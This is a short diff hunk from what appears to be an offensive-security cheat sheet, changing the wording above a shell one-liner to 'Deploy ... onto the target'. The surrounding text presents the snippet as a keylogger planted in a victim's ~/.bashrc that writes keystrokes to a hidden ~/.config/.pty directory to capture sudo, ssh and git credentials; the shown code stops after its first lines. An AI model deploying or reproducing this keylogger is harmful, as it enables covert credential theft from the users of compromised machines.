@@ -1890,7 +1890,7 @@ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I <input.txt.enc >input.
 
 A 1-liner for `~/.bashrc` to sniff the user's keystrokes and save them to `~/.config/.pty/.@*`. Useful when not root and needing to capture the sudo/ssh/git credentials of the user. 
 
-Cut & paste the following and follow the instructions:
+Deploy: Cut & paste the following onto the target and follow the instructions:
 ```sh
 command -v bash >/dev/null || { echo "Not found: /bin/bash"; false; } \
 && { mkdir -p ~/.config/.pty 2>/dev/null; [ $(uname -m) == aarch64 ] && s=aarch64_arm64; :; } \
